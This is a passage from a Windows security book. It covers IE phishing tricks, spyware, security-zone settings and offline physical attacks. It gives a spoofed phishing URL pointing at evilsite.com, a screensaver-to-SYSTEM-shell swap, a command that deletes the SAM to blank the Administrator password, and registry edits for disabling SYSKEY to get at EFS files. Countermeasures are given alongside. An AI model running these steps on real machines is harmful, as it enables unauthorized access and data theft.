interrupt loading of a new page. The result is quite disturbing: browsing what appears  to be a legitimate site like CNN.com, with contents totally controlled by some other site.  Michal’s proof-of-concept demonstrates this, as shown in Figure 10-2.  Another example is the “IE improper URL canonicalization” vulnerability that was  widely  exploited  in  early  2004  by  phishing  scammers.   See  “References  and  Further  Reading.”   This  vulnerability  was  exploited  by  placing  a  special  character  in  URLs  commonly used to authenticate to websites of this format: http:  username:password@site.com restofurl  This  behavior  is  per  the  HTTP  RFC  specification  and  is  perfectly  normal.  The  vulnerability  results  when  inserting  hexadecimal  characters  in  place  of  the  username: password syntax—for example: http:  www.microsoft.com%01@www.malware.com  Figure 10-2  Another entrapment bug: is this really CNN.com?   330   Hacking Exposed Windows: Windows Security Secrets & Solutions   Note  the  bolded  hexadecimal %01,  which  causes  IE  to  display  microsoft.com  in  the  address bar, but it would be malware.com’s content that was loaded. Phishers couldn’t  ask for a better vulnerability, because now all they had to do was dress up their fraudulent  sites to look like some online bank, and their victim’s couldn’t even rely on the address  bar to tell them any different! Figure 10-3 shows a phishing e-mail designed to exploit  this vulnerability. Note some of the familiar traits  authenticity is spoofed using familiar  brand  imagery,  action  is  compelled  with  urgency ,  all  topped  off  by  the  tantalizing  Continue button right in the middle of the message, urging the victim to click and simply  take care of this issue. This button links to http:  myaccount.earthlink.net%01@evilsite.com password PasswordReset.htm If  someone  clicks  this  button,  their  browser  address  bar  will  read  http:  myaccount .earthlink.net   the  legitimate  EarthLink  account  management  site ,  but  the  victim  will  actually be browsing a fraudulent password harvesting site at evilsite.com password  PasswordReset.htm.  Figure 10-3  A phishing e-mail that exploits an IE vulnerability; the button links to http:  myaccount .earthlink.net%01@evilsite.com password PasswordReset.htm   Chapter 10:  Hacking Microsoft Client Apps   331  This  particular  vulnerability  was  not  patched  for  several  months,  illustrating  the   need to be more proactive in defending against phishing attacks.  Even scarier than special characters like hexadecimal notation are URLs with one or a few characters  expressed in an international language, creating visually similar spellings that are in fact quite different  sites. IE 7’s International domain name anti-spoofing feature helps mitigate this.  Phishing Countermeasures on Windows Thanks  unfortunately  to the burgeoning popularity of this type of scam, the Internet is  awash in advice on how to avoid and respond to phishing scams. The resources we’ve  found to be the most helpful are listed in “References and Further Reading.”  New online services have sprung up recently to assist end users identify phishing  scams. In fact, with IE 7, a new Phishing Filter feature gives users indication when they  are browsing a known phishing site. The list of known phishing sites is kept up to date  on a service run by Microsoft in the same manner as antivirus programs update their  virus definitions. The Phishing Filter can be enabled in the Control Panel under Internet  Options, on the Advanced tab, under Phishing Filter. There is also a context menu under  the IE7 Tools toolbar that permits access to several Phishing Filter features, including  Check This Website, which will tell you whether the current website is on Microsoft’s list  of known phishing sites. This feature is shown in Figure 10-4.  We think the IE 7 Phishing Filter is a long overdue mechanism for protecting users  from phishing scams, and we encourage readers to enable it. Microsoft appears to be  drawing  on  unique  data  sources,  such  as  its  own  Hotmail  Windows  Error  Reporting   a.k.a. “Dr Watson”  services, for known phishing site data, so their Phishing Filter may  offer advantages over competitive services.  In addition, reading e-mail in plaintext format can help reduce the effectiveness of  one  of  the  key  tools  of  phishers,  spoofing  authenticity  using  familiar  brand  imagery.  Additionally, plaintext e-mail allows you to see fraudulent inline hyperlinks blatantly,  since they appear in angle brackets     when viewed in plaintext. For example,   Figure 10-4  The result of checking a website using IE7’s Phishing Filter   332   Hacking Exposed Windows: Windows Security Secrets & Solutions   here’s  a  hyperlink  that  would  normally  appear  as  underlined  blue  inline  text  when  viewed as HTML: Click here to go to our free gift site!  When viewed as plaintext, this link now appears with angle brackets: Click here   to go to our free gift site!  Last but not least, we recommend a healthy skepticism when dealing with all things  on the Internet, especially unsolicited e-mail communications. Our advice is never click  hyperlinks in unsolicited e-mail. If you’re worried about the message, open up a new  browser and type in the URI manually  for example, www.paypal.com , or click a known  good favorite. It’s not that difficult to pick up this habit, and it dramatically decreases the  likelihood of being phished.  Spyware Popularity: Simplicity: Impact:  Risk Rating:  8 6 8 7  Most  users  are  familiar  with  software  that  behaves   mostly   transparently  and  according  to  expectations.  Anyone  who  has  read  this  chapter  is  also  familiar  with  software  that  undeniably  performs  activities  that  no  sane  user  would  authorize.  Somewhere between these two extremes sits a broad class of programs that may perform  some activities with the consent of the user, and others without.  Adware is broadly defined as software that inserts advertisements into your everyday  computing activities. The best example of adware is those annoying pop-up ads that can  overwhelm your browser when you visit a site with abusive advertising practices. Some  adware is legitimate, but some crosses the line in unauthorized abuse. 180Solutions is a  company  notorious  for  using  deceptive  software  techniques  to  further  their  online  advertising business.  Spyware is designed to monitor user behavior surreptitiously, usually for purposes  of logging and reporting that behavior to online tracking companies that in turn sell this  information to advertisers or online service providers. Corporations, private investigators,  law enforcement, intelligence agencies, suspicious spouses, and so on have also been  known to use spyware for their own purposes, legitimate and not so.  Numerous resources are available on the Internet that catalog and describe annoying  and malicious software like adware and spyware  see “References and Further Reading” .  The rest of our discussion will cover common spyware and adware insertion techniques  and how to rid yourself of these pests.  Common  Insertion Techniques  Adware  and  spyware  can  get  on  your  machine  in  two  ways:  by  exploiting  a  vulnerability  that  we  already  discussed  in  the  first  part  of  this  chapter, or by convincing the user to install it willingly. A range of methods are used for    Chapter 10:  Hacking Microsoft Client Apps   333  achieving  the  latter.  Relatively  forthcoming  programs  will  present  a  straightforward  installation routine that includes an affirmative opt-in to installation, as well as an End  User License Agreement  EULA  that spells out expectations  although most users ignore  these obtuse legalisms . At the other end of the spectrum is outright deceptive software  that installs completely covertly, as part of the installation routine for other software, for  example. Microsoft has actually produced some interesting criteria for what constitutes  deceptive software and is implementing these criteria in its anti-malware products and  services  see “References and Further Reading” .  Common Insertion Locations  Spyware and adware typically insert themselves via one or  more of the following techniques:     By installing an executable ﬁ le to disk and referencing it via an auto-start   extensibility point  ASEP      By installing add-ons to web browser software  The importance of ASEPs to proliferation of annoying, deceptive, and even downright  malicious software cannot be underestimated—in our opinion, ASEPs account for 99 percent  of the hiding places used by these miscreants. Some good lists of ASEPs can be found in  “References and Further Reading.” You can also examine your own system’s ASEPs using  the msconfig tool on Windows XP  choose Start  Run, and enter msconfig . Figure 10-5  shows the msconfig tool enumerating startup items on a typical Windows XP system.  Figure 10-5  The msconﬁ g utility enumerates auto-start extensibility points on Windows XP. Note  the peer-to-peer networking software program highlighted here.   334   Hacking Exposed Windows: Windows Security Secrets & Solutions   ASEPs are numerous, and they are generally more complex than the average user  wishes to confront  especially considering that uninformed manipulation of ASEPs can  result in system instability , so we don’t recommend messing with them yourself unless  you really know what you are doing. Use an automated tool like those we will recommend  shortly.  Right up there with ASEPs in popularity are web browser add-ons, a mostly invisible  mechanism for inserting helpful functionality into your web browsing experience. One  of  the  most  insidious  browser  add-on  mechanisms  is  the  Internet  Explorer  Browser  Helper Object  BHO  feature  see “References and Further Reading” . Up until Windows  XP SP2, BHOs were practically invisible to users, and they could perform just about any  action feasible with IE. Talk about taking a good extensibility idea too far—BHOs remind  us of Frankenstein’s monster. Fortunately, beginning in XP SP2, the Add-On Manager  feature  under Tools  Manage Add-ons  now will at least enumerate and control BHOs  running within IE. You’ll still have to decide whether to disable them manually, which  can be a confusing task since some deceptive software provides little information with  which to make this decision within the IE user interface. Alternatively, you can use one  of the third-party tools we recommend next.  Adware and Spyware Countermeasures One  of  the  best  mechanisms  for  fighting  annoying  and  deceptive  software  is  at  the  economic level. Don’t agree to install adware or spyware on your system in exchange for  some cool new software gadget  like peer-to-peer file sharing utilities .  You can also fight back directly using anti-adware spyware tools. Germany hosts  the  top  two  contenders:  Spybot  Search  &  Destroy  and Ad-Aware  from  Lavasoft   see  “References and Further Reading” .  In  addition  to  these  free  anti-spyware  programs,  a  robust  commercial  market  is  evolving. Webroot’s SpySweeper consistently gets top honors in the reviews we’ve seen,  based on comprehensiveness, ease of use, and feature set. In addition, most of the leading  antivirus security software companies such as Symantec and McAfee have amplified  their offerings with anti-spyware capabilities. Comparison shopping among the various  options is as easy as Googling “anti-spyware reviews.”  Never to be outdone for long in any software industry sector, Microsoft has joined  the fray with an anti-spyware product of its own, called Windows Defender. Defender is  also  free   and  ships  by  default  with  Vista ,  and  Microsoft  appears  to  have  put  solid  resources behind the malware research that undergirds the product. They also intend to  release  a  consumer-focused  online  service  version  of  the  product  called  Windows  OneCare, which may offer the ultimate in convenience to end users who would be happy  simply  to  pay  a  monthly  fee  to  make  the  whole  problem  of  annoying  and  deceptive  software just go away. See “References and Further Reading” for more information about  Microsoft’s various offerings in this space.  GENERAL COUNTERMEASURES  After years of researching and writing about the various past and future challenges of  online  client  security,  we’ve  assembled  the  following  “10  Steps  to  a  Safer  Internet    Chapter 10:  Hacking Microsoft Client Apps   335  Experience”  that  weaves  together  advice  we’ve  covered  in  detail  previously  in  this  chapter, plus some general best practices:                            1.  Deploy a personal ﬁ rewall, ideally one that can also manage outbound connection   attempts. The updated Windows Firewall in XP SP2 and later is a good option.  2.  Keep up to date on all relevant software security patches. Windows users   should conﬁ gure Microsoft Automatic Updates to ease the burden of this task.  3.  Run antivirus software that automatically scans your system  particularly  incoming mail attachments  and keeps itself updated. We also recommend  running anti-adware spyware and anti-phishing utilities discussed in this  chapter.  4.  Conﬁ gure Windows Internet Options on the Control Panel  also accessible   through IE and Outlook OE  wisely.  5.  Run with least privilege. Never log on as Administrator  or equivalent highly-  privileged account  on a system that you will use to browse the Internet or read  e-mail. Use reduced-privilege features like Windows UAC and Protected Mode  IE  PMIE  where possible.  6.  Administrators of large networks of Windows systems should deploy the above   technologies at key network choke points  that is, network-based ﬁ rewalls in  addition to host-based, antivirus on mail servers, and so on  to protect large  numbers of users more efﬁ ciently.  7.  Read e-mail in plaintext. 8.  Conﬁ gure ofﬁ ce productivity programs as securely as possible; for example, set   the Microsoft Ofﬁ ce programs to Very High macro security under the Tools   Macro  Security. Consider using MOICE  Microsoft Ofﬁ ce Isolated Conversion  Environment  when opening Word, Excel, or PowerPoint binary format ﬁ les.  9.  Don’t be gullible. Approach Internet-borne solicitations and transactions with   high skepticism. Don’t click links in e-mails from untrusted sources!    10.  Keep your computing devices physically secure.  Links to more information about some of these steps can be found in “References and  Further Reading” at the end of this chapter. Next, we’ll expand a bit on some of the items  in this list that we have not discussed in this chapter.  IE Security Zones  Call  us  old-fashioned,  but  we  think  one  of  the  most  overlooked  aspects  of  Windows  security is Security Zones. OK, maybe you’ve never heard of Security Zones, or maybe  you’ve  never  been  exposed  to  how  elegantly  they  can  manage  the  security  of  your  Internet experience, but it’s high time you found out.  Essentially, the zone security model allows users to assign varying levels of trust to  software behavior within any of four zones: Local Intranet, Trusted Sites, Internet, and  Restricted Sites. As we’ve seen, a fifth zone called the Local Machine Zone  LMZ  exists,  but it is not available in the user interface because it is configurable only using special  tools or direct tweaks to the Windows Registry.   336   Hacking Exposed Windows: Windows Security Secrets & Solutions   Sites can be manually added to every zone except the Internet zone. The Internet zone  contains all sites not mapped to any other zone, and any site containing a period  .  in its  URL.  For example, http:  local is part of the Local Intranet zone by default, whereas  http:  www.microsoft.com is in the Internet zone because it has periods in its name.   When you visit a site within a zone, the specific security settings for that zone apply to  your  activities  on  that  site.   For  example,  Run  ActiveX  Controls  may  be  allowed.   Therefore, the most important zone to configure is the Internet zone, because it contains  all the sites a user is likely to visit by default. Of course, if you manually add sites to any  other zone, this rule doesn’t apply. Be sure to select trusted and untrusted sites carefully  when populating the other zones—if you choose to do so at all.  Typically, other zones  will be populated by network administrators for corporate LAN users.   Conﬁ guring the Internet Zone To configure security for the Internet zone, choose Tools  Internet Options  Security  Within IE  or open Internet Options on the Control Panel , highlight the Internet zone,  click  Default  Level,  and  move  the  slider  up  to  an  appropriate  point.  We  recommend  setting it to High and then using the Custom Level button to go back manually and disable  all other active content, plus a few other usability tweaks, as shown in Table 10-2.  Some of the Internet Zone settings related to ActiveX are shown in Figure 10-6.  Category  Setting Name  Comment  ActiveX controls and  plug-ins  Cookies  Downloads  Script ActiveX  controls marked  “safe for scripting” Allow per-session  cookies  not stored  File download  Scripting  Active scripting  Enable  Miscellaneous  Miscellaneous  Miscellaneous  Allow scripting of  IE Web browser  control Allow META  REFRESH Launching  programs and ﬁ les  in an IFRAME  Recommended  Setting  Disable  Enable  Enable  Disable  Disable  Prompt  Client-resident “safe”  controls can be exploited.

Powerful ActiveX control  that should be restricted.  Can be used to load  unexpected pages. Frequently exploited  to execute code in  unauthorized domains.  Table 10-2  Recommended Internet Zone Security Settings  Custom Level Settings Made After  Setting Default to High    Chapter 10:  Hacking Microsoft Client Apps   337  Figure 10-6  Blocking “safe for scripting” ActiveX controls using Internet Options on the Control  Panel will protect against malicious controls downloaded via hostile web pages.  Achieving Compatibility with Trusted Sites The bad news is that disabling, say, ActiveX may result in problems viewing sites that  depend on controls for special effects. One solution to this problem is to enable ActiveX  manually when visiting a trusted site and then manually shut it off again. The smarter  thing to do is to use the Trusted Sites security zone. Assign a lower level of security  we  recommend Medium  to this zone and add trusted sites to it. This way, when visiting a  site  that  implements  ActiveX   such  as  Microsoft’s  Windows  Update  patching  site,  windowsupdate.microsoft.com ,  the  weaker  security  settings  apply,  and  the  site’s  ActiveX features still work. Similarly, adding auto.search.msn.com to Trusted Sites will  support IE’s auto-search feature that leads the browser from a typed-in address such as  mp3 to http:  www.mp3.com. Aren’t security zones convenient?  Be very careful to assign only highly trusted sites to the Trusted Sites zone, because fewer restrictions  will be placed on active content downloaded and run by them. Be aware that even respectable-looking  sites may have been compromised by malicious hackers or might have one rogue developer who’s out  to harvest user data  or worse .   338   Hacking Exposed Windows: Windows Security Secrets & Solutions   Use Locked-down Restricted Sites for Reading E-mail The Restricted Sites zone is the opposite of the Trusted Sites zone—sites viewed in this  zone  are  completely  untrustworthy  and  thus  the  security  settings  for  Restricted  Sites  should be set to the most aggressive possible. In fact, we recommend that the Restricted  Sites zone be configured to disable all settings! This means set it to High, and then use  the Custom Level button to go back and manually disable everything that High leaves  open  or set them to “high safety” if Disable is not available .  You won’t actually assign sites to the Restricted Sites zone as we recommended with  Trusted Sites, but you should use Restricted Sites for performing any high-risk activity,  such as reading e-mail  think of Restricted Sites like a “security sandbox” . Fortunately,  you can also assign zone-like behavior to Outlook Outlook Express  OE  for purposes of  reading mail securely. With Outlook OE, you select which zone you want to apply to  content  displayed  in  the  mail  reader—either  the  Internet  zone  or  the  Restricted  Sites  zone. Of course, we recommend setting it to a completely locked-down Restricted Sites   this has been the default in Outlook and OE since roughly 2000 . Figure 10-7 shows how  to configure Outlook for Restricted Sites.  Figure 10-7  Conﬁ guring Outlook to use the Restricted Sites zone when browsing   Chapter 10:  Hacking Microsoft Client Apps   339  Low-privilege Browsing  As with IE, the same drawbacks exist to setting Outlook to the most restrictive level.  However, active content is more than just an annoyance when it comes in the form of an  e-mail message, and the dangers of interpreting it far outweigh the aesthetic benefits.  Managing Security Zones at Scale Prior to Windows XP SP2, the only supported mechanisms for managing Security Zone  settings across large numbers of machines was via the IE user interface, or via the IE  Administration Kit  IEAK . With XP SP2, Security Zone settings are managed using the  Group Policy Management Console and, if set, can be changed only by a Group Policy  object  GPO  or by an administrator. Of course, Group Policy requires Windows Server  Active Directory, so this is not a truly lightweight management option, but we think it’s  important to highlight for administrators of large numbers of Windows systems.  It’s  slowly  dawning  on  the  dominant  browser  vendor  that  perhaps  the  web  browser  wields too much power in many scenarios, and the company has recently started taking  steps to limit the privileges of its software to protect against the inevitable 0-day exploit. On Windows Server 2003, Microsoft’s default deployment of IE runs in Enhanced  Security Configuration  ESC . This is an extremely restricted configuration that requires  interactive user validation to visit just about any site. Effectively, the user must manually  add every site requiring even moderate active functionality to the Trusted Sites zone.  While  this  user  experience  is  probably  unacceptable  for  casual  web  browsing,  it’s  something we highly advise for servers, where activities like web and e-mail browsing  should be forbidden by policy.  See “References and Further Reading” for more about  ESC, including how to enforce it using Group Policy.   We’ve already mentioned Protected Mode IE  PMIE  in this chapter. PMIE is an IE 7  feature  that  leverages  the  Windows  Vista  UAC  infrastructure  to  limit  IE’s  default  privileges.  See Chapters 2 and 13 for more information about PMIE and UAC.  PMIE  uses the Mandatory Integrity Control  MIC  feature of UAC so that it cannot write to  higher integrity objects. Effectively, this means that PMIE can write only to the Temporary  Internet  Files   TIF   and  Cookies  folders  for  the  currently  interactive  user  account.  It  cannot write to other folders  like %userprofile% or %systemroot% , sensitive Registry  hives  like HKEY Local Machine or HKEY Current User , or even other processes of higher  integrity.  PMIE  thus  provides  a  nice  sandbox  for  browsing  untrusted  resources.  By  default in Vista, PMIE is configured for browsing sites in the Internet, Restricted Sites,  and Local Machine zones. Microsoft did not ship PMIE to pre-Vista Windows versions  such as XP SP2, since it requires the UAC infrastructure of Vista.  For those of you who run other browsers, obviously PMIE is not an option as of this  writing. Although  obviously  not  as  robust  as  PMIE,  running  alternative  browsers  on  Vista within a non-Administrators account context with UAC provides protection against  obvious executable drive-by attempts.  For Windows XP, we’ve also heard of colleagues running Firefox as a lower-privileged  Windows account  such as Guest  using the runas tool on XP. Be careful, though, because  running IE as a lower-privileged user has been discussed on mailing lists for some time,  and  in  some  scenarios  the  protection  is  not  what  it  seems.  For  example,  when  IE  is    340   Hacking Exposed Windows: Windows Security Secrets & Solutions   embedded in another application, launched via COM, or started via clicking a URL, it still  runs as the current interactive account. This can lead to confusion over which IE windows  are low-privileged and which are not. We’re not sure if these weaknesses translate to non- IE browsers or not. And of course, since the lower-privileged browser processes are still  running on the same desktop with other applications, so-called Shatter attacks are still  feasible, in which one process attacks another via Windows messaging queues.  SUMMARY  We hope this little jaunt to the other side of the client server model has been eye-opening.  At the very least, it should invite broader consideration of the entire security posture of  Windows  technology  infrastructures,  including  those  ornery  end  users.  Sleep  better  knowing that good user awareness  driven by policy , updated software  go to IE’s Tools   Windows Update , properly configured IE Security Zones, and network-based antivirus  content filtering can keep the threat to a minimum.

Solutions   Up  to  this  point,  we  have  considered  several  logical  attacks  mounted  over  a   network  by  an  adversary.  This  chapter  breaks  from  that  approach  to  discuss  attacks  launched  with  unrestricted  physical  access  to  a  Windows  system.  Although numerous physical attack paradigms can be effective in different scenarios,  since this book is focused on Windows, we limit our discussion to two:    Ofﬂ ine attacks  These typically involve booting the target computer to an   alternative operating system to perform the attack, and they typically require  substantial time and interaction to implement successfully. The standard  scenario here is a stolen laptop that is no longer under physical control of  the authorized user.    Online attacks  The machine is attacked while running, typically via “user   vs. user” attacks, or by connecting a malicious device, media, and or network  to compromise the entire system. These attacks typically require only a few  seconds and little or no interaction. The standard scenario here is a machine that  remains under physical control of the authorized user, but is administratively  controlled  “rootkitted”  by the attacker.  Both  of  these  attack  types  are  designed  to  bypass  the  operating  system’s  security  controls, rendering them useless. We focus on those attacks that are relevant to specific  features of Windows designed to mitigate them.  OFFLINE ATTACKS  This  book  has  catalogued  the  many  security  controls  implemented  by  the  Windows  operating system. However, if Windows isn’t loaded, it cannot enforce those controls,  and all the data on the system becomes accessible to whatever operating environment  takes its place.  Numerous mechanisms for booting to alternative operating environments exist for  Windows PCs. One of the earliest and easiest was simply to boot to Windows’ command- line predecessor, DOS. DOS was limited in its functionality, however, and this led to the  release of products like Sysinternals’ freeware NTFSDOS and Winternals’ more advanced  ERD  Commander  that  provided  an  advanced  offline  system  repair,  diagnosis,  and  recovery environment that addressed many of DOS’s shortcomings  such as the inability  to deal with the NT File System, or NTFS .  Microsoft  subsequently  got  into  the  act  with  WinPE   for  Windows  Preinstallation  Environment , a non-public, lightweight version of Windows XP that could be loaded  from a CD-ROM or DVD. Bart Lagerweij has released a freeware alternative to WinPE  called BartPE that imitates the WinPE functionality  offering a self-contained, bootable  Win32 environment with network support, a graphical user interface up to 800×600, and  FAT NTFS CDFS file system support .   Chapter 11:  Physical Attacks   347  Of  course,  any  other  operating  system  can  be  loaded  in  place  of  Windows  and  subsequently  used  to  access  Windows  resources  in  an  offline  state.  Because  of  its  extensibility and small kernel footprint, Linux is commonly used to build boot disks that  can be used to sidestep Windows and attack the system in an offline state, as we will see  in this chapter. Virtualization software is another alternative to gaining offline access,  using tools such as VMWare or Parallels to mount offline disks.  Undoubtedly, we’ve missed a few of the many ways to boot Windows PCs to alternate  operating environments, but those listed here are the classics. Enough preparation—let’s  jump  in  and  examine  the  types  of  attacks  that  are  possible  once  Windows  has  been  removed from the picture.  Replacing the Screensaver  Popularity: Simplicity: Impact: Risk Rating:  8 9 5 7  We’ll start our discussion of physical attacks with a simple but potentially devastating  trick: copying the NT family command shell  %systemroot%\system32\cmd.exe  over  the logon screensaver  %systemroot%\system32\logon.scr . You can do this using any  boot media that can mount the system partition  for example, NTFSDOS .  As simple as this attack may sound, it works on Windows 2000 and previous versions:  once the screensaver kicks in, a command shell pops up, running in the context of the  SYSTEM  account.  From  here,  you  can  issue  the  explorer  command  to  launch  a  graphical shell or simply go to town via the command shell.  Of course, the system must be booted to the alternate operating environment, and  then the attacker has to wait for the screensaver to kick in before exploiting the situation,  so a successful attack requires somewhat unrestricted and unmonitored physical access  to the victim machine. A batch script could be used to automate the copying of cmd.exe  over logon.scr, reducing somewhat the amount of time an attacker has to spend in front  of the target machine. In this scenario, the attacker could walk up, insert a CD-ROM,  power cycle the system, and remove the CD once it’s done its dirty work. The attacker  then has to wait until the screensaver kicks in before actually getting to any juicy data.  Would you be back from your coffee break by then?  Once the SYSTEM shell has been obtained, it is fairly easy to attack the system via  techniques outlined in Chapter 7, exposing it to the many risks we will discuss in the  remainder of this chapter.  Countermeasures to Replacing the Screensaver This is an easy one—upgrade to Windows Server 2003 or later. Although this will not deflect  this attack, it does lower the privilege of the resulting shell to the Local Service account.   348   Hacking Exposed Windows: Windows Security Secrets & Solutions   Nullifying the Administrator Password by Deleting the SAM  Popularity: Simplicity: Impact: Risk Rating:  8 9 10 9  On  July  25,  1999,  James  J.  Grace  and  Thomas  S.V.  Bartlett  III  released  a  stunning  paper describing how to nullify the Administrator password by booting to an alternate  OS and deleting the SAM file. Yes, amazingly simple as it sounds, the act of deleting the  SAM file while the system is offline results in the ability to log in as Administrator with  a NULL password when the system is rebooted. This attack also deletes any existing user  accounts presently on the target system, but if these are of secondary importance to the  data on disk, this is of little concern to the attacker.  The attack could be implemented in various ways, but the most straightforward is to  boot to any alternative operating environment and delete the file. The following command  is performed from a floppy disk mounted as the A: drive that has used NTFSDOS to  mount the Windows C: partition in an offline state: A:\>del c:\winnt\system32\config\sam This assumes that the system folder retains default naming conventions. Use the dir command or echo %systemroot% to check the actual path.  When  the  system  is  next  booted,  Windows  re-creates  a  default  SAM  file,  which  contains  an Administrator  account  with  a  blank  password.  Simply  logging  on  using  these credentials will yield complete control of the system.  It is important to note here that Windows 2000 and later domain controllers are not  vulnerable to having the SAM deleted because they do not keep password hashes in the  SAM. However, Grace and Bartlett’s paper describes a mechanism for achieving essentially  the same result on domain controllers by installing a second copy of Windows 2000.  We discuss countermeasures for this attack in the upcoming section entitled “Countermeasures for  Offline Attacks.”  Injecting Hashes into the SAM with chntpw  Popularity: Simplicity: Impact: Risk Rating:  8 10 10 9  Attackers who desire a more sophisticated physical attack mechanism that doesn’t  obliterate  all  accounts  on  the  system  can  inject  password  hashes  into  the  SAM  while  offline using a Linux boot floppy and chntpw by Petter Nordahl-Hagen. Yes, you heard    Chapter 11:  Physical Attacks   349  right: change any user account password on the system, even the Administrator, and even if it  has been renamed.  Catch  your  breath—here’s  an  even  more  interesting  twist:  injection  works  even  if  SYSKEY has been applied, and even if the option to protect the SYSKEY with a password  or store it on a floppy has been selected.  “Wait a second,” we hear someone saying. “SYSKEY applies a second, 128-bit strong  round of encryption to the password hashes using a unique key that is either stored in  the Registry, optionally protected by a password, or stored on a floppy disk  see Chapter 2 .  How in blazes can someone inject fraudulent hashes without knowing the system key  used to create them?”  Petter figured out how to turn SYSKEY off. Even worse, he discovered that an attacker  wouldn’t have to—old-style pre-SYSKEY hashes injected into the SAM will automatically be  converted  to  SYSKEYed  hashes  upon  reboot.  You  have  to  admire  this  feat  of  reverse  engineering.  For the record, here’s what Petter does to turn off SYSKEY  even though he doesn’t   have to :           1.  Set HKLM\System\CurrentControlSet\Control\Lsa\SecureBoot to 0 to   disable SYSKEY.  The possible values for this key are 0–Disabled; 1–Key stored  unprotected in Registry; 2–Key protected with passphrase in Registry; 3–Key  stored on ﬂ oppy.   2.  Change a speciﬁ c ﬂ ag within the HKLM\SAM\Domains\Account\F binary   structure to the same mode as SecureBoot earlier. This key is not accessible  while the system is running.  3.  On Windows 2000 only, the HKLM\security\Policy\PolSecretEncryptionKey\    key will also need to be changed to the same value as the previous  two keys.  According to Petter, changing only one of the first two values on NT 4 up to SP6  results  in  a  warning  about  inconsistencies  between  the  SAM  and  system  settings  on  completed boot, and SYSKEY is reinvoked. On Windows 2000, inconsistencies between  the three keys seem to be silently reset to the most likely value on reboot.  Once again, we remind everyone that this technique as currently written will not  change user account passwords on Windows 2000 and later domain controllers because  it  targets  only  the  SAM  file.  Recall  that  on  domain  controllers,  password  hashes  are  stored in the Active Directory, not in the SAM.  Use of these techniques may result in a corrupt SAM, or worse. Test them only on expendable NT  family installations, as they may become unbootable. In particular, do not select the Disable SYSKEY  option in chntpw on Windows 2000 and later. It has reportedly had extremely deleterious effects, often  requiring a complete reinstall.  Implications for EFS  The  aforementioned  offline  attacks  against  the  SAM  have  grave  implications  for  the  Encrypting File System  EFS , which was first implemented in Windows 2000 to prevent  physical compromise of the system from resulting in compromise of the data it carried.   350   Hacking Exposed Windows: Windows Security Secrets & Solutions   Links to more information on EFS can be found in “References and Further Reading,”  but in brief, EFS can encrypt a file or folder with a fast, symmetric encryption algorithm  using a randomly generated file encryption key  FEK  specific to that file or folder. EFS  uses  the  Extended  Data  Encryption  Standard   DESX   as  the  encryption  algorithm.   Windows Server 2003 implements additional algorithms.  The randomly generated FEK  is then itself encrypted with one or more public keys, including those of the user  each  user under Windows 2000 and later receives a public private key pair  and a key recovery  agent. These encrypted values are stored as attributes of the file.  Key recovery is implemented in case users who have encrypted some sensitive data  leave  an  organization  or  their  encryption  keys  are  lost,  for  example.  To  prevent  unrecoverable loss of the encrypted data, Windows 2000 and later mandates the existence  of a data recovery agent for EFS—EFS will not work without a recovery agent. Because  the FEK is completely independent of a user’s public private key pair, a recovery agent  may decrypt the file’s contents without compromising the user’s private key. The default  data recovery agent for a system is the local Administrator account.  Unfortunately, bypassing EFS using offline attacks is nearly as trivial as bypassing  the OS itself using techniques we’ve already demonstrated. This situation arises from the  close  intertwining  of  Windows  user  account  credentials  with  the  cryptographic  keys  used to unlock EFS. This is a classic cryptographic weakness—although the algorithms  and implementation of EFS are quite secure on paper, the system is ultimately hamstrung  by its reliance on a simple username password pair for much of its security. Next, we  look at some specific attacks against EFS.  Reading EFS-Encrypted Files Using the Recovery Agent Credentials  Popularity: Simplicity: Impact: Risk Rating:  8 9 10 9  The ability to nullify or overwrite the Administrator account password takes on a  more serious scope once it is understood that Administrator is the default key recovery  agent  for  EFS.  Once  successfully  logged  in  to  a  system  with  the  blank Administrator  password, EFS-encrypted files are decrypted as they are opened, since the Administrator  can transparently access the FEK using its recovery key.  To understand how this works, recall that the randomly generated FEK  which can  decrypt the file  is itself encrypted by other keys, and these encrypted values are stored  as attributes of the file. The FEK encrypted with the user’s public key  every user under  Windows 2000 and later receives a public private key pair  is stored in an attribute called  the Data Decipher Field  DDF  associated with the file. When the user accesses the file,  her private key decrypts the DDF, exposing the FEK, which then decrypts the file. The  value resulting from the encryption of the FEK with the recovery agent’s key is stored in  an attribute called the Data Recovery Field  DRF . Thus, if the local Administrator is the    Chapter 11:  Physical Attacks   351  defined recovery agent  which it is by default , anyone who attains Administrator  RID  500  on this system is able to decrypt the DRF with her private key, revealing the FEK,  which can then decrypt any local EFS-protected file.  Defeating Recovery Agent Delegation  But wait—what if the recovery agent is delegated to  parties other than the Administrator? Grace and Bartlett defeated this countermeasure  by planting a service to run at startup that resets the password for any account defined  as a recovery agent  which is pretty heavy handed, since at this point, one effectively  owns the system anyway .  Of course, an attacker doesn’t have to focus exclusively on the recovery agent; it just  happens to be the easiest way to access all of the EFS-encrypted files on disk. Another  way to circumvent a delegated recovery agent is simply to masquerade as the user who  encrypted the file. Using chntpw  as discussed earlier , any user’s account password can  be reset via offline attack. An attacker could then log on as the user and decrypt the DDF  transparently with the user’s private key, unlocking the FEK and decrypting the file. The  data recovery agent’s private key is not required.  You can use the Resource Kit efsinfo tool to determine to which account an encrypted file belongs  with the following syntax: efsinfo  r  u [filename].  Reading  EFS-Encrypted  Data  with  User  Account  Credentials  It  is  critical  to  note  here  that  attacking the default recovery agent  the local Administrator account for non-domain- joined machines  is the easiest method only for attacking EFS. Attacking user accounts  will always allow decryption of any file encrypted by that user account via EFS. Remember  that the FEK encrypted with the user’s private key is stored in the DDF associated with  every  EFS-encrypted  file.  The  act  of  logging  on  as  that  user  will  allow  transparent  decryption of every file she previously encrypted. The only real protection against user  account attacks against EFS is SYSKEY mode 2 or 3  discussed next . Although SYSKEY  2 3 can be disabled using chntpw, EFS-encrypted files cannot be decrypted, because EFS  keys are stored in the Local Security Authority  LSA  Secrets cache, which requires the  SYSKEY to unlock. The original SYSKEY is not available if disabled using chntpw.  Countermeasures for Ofﬂ ine Attacks As long as attackers can gain unrestricted physical access to a system, countering these  attacks is quite difficult.  The most effective ways to stop offline attacks are to keep systems physically secure   using  locks,  monitoring,  and or  alarms  as  appropriate  for  the  room,  computer  case,  and or mobile device , remove or disable bootable removable media drives, and set a  BIOS password that must be entered before the system can be bootstrapped. Optimally,  set a password for hard drive access using ATA-3 specs or greater. Effective monitoring  procedures are also important, so even if someone does manage to get to a machine, at  least his actions are recorded  such as via video surveillance . We recommend using all  of these mechanisms where physical security risks are high.   352   Hacking Exposed Windows: Windows Security Secrets & Solutions   For stand-alone systems  we’ll talk about the implications of joining a domain in a  moment ,  the  only  OS-level  method  to  blunt 